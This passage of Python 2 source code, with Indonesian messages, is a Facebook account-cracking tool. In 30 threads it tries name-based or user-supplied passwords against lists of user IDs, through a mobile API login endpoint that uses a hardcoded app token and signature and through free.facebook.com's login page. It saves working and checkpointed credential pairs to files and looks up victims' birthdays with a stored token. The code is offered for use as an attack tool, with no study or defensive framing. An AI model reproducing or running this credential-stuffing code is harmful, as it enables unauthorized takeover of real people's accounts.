    ask = raw_input(' \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Password Manual? [Y/t]   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
    print ''
    def main(arg):
        global cp
        global loop
        global ok
        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                respon = requests.get(api, params=param, headers=kontol)
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    print '\r  \x1b[0;92m[LIVE] ' + uid + '|' + pw + '        '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [LIVE] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass
                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
    exit()
def manualbapi():
    print '\n [\xe2\x80\xa2] Contoh Password : bismillah,sayang,rahasia'
    pw = raw_input(' [?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
    print ''
    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': asu, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                respon = requests.get(api, params=param, headers=kontol)
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    print '\r\x1b[0;92m  [LIVE] ' + uid + '|' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [LIVE] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
    exit()
def freefb():
    ask = raw_input(' \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Password Manual? [Y/t]   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
    if ask == 'Y' or ask == 'y':
        manualfreefb()
    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
    print ''
    def main(arg):
        global loop
        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas})
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[1;92m  [LIVE] ' + uid + '|' + pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass
                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
    exit()
def manualfreefb():
    print '\n [\xe2\x80\xa2] Contoh Password : bismillah,sayang,rahasia'
    pw = raw_input(' [?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
    print ''
    def main(arg):
        global loop
        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas})
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[1;92m. *--> ' + uid + '|' + asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;93m  CHECKPOINT ' + uid + '|' + asu + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  CHECKPOINT ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass
                    print '\r\x1b[1;93m  CHECKPOINT ' + uid + '|' + asu + '                        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  CHECKPOINT ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
    exit()
if __name__ == '__main__':
    os.system('clear')
    login()
# Mau Ngapain Cuk?